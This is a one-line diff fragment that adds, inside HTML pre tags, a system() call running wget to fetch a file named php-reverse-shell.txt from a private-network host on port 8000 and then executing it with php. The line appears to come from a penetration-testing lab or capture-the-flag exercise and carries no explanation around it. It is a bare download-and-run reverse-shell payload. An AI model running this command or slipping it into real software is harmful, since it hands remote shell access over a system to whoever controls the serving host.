@@ -1,0 +1,1 @@
+<pre>system('wget http://192.168.49.149:8000/php-reverse-shell.txt && php php-reverse-shell.txt')</pre>
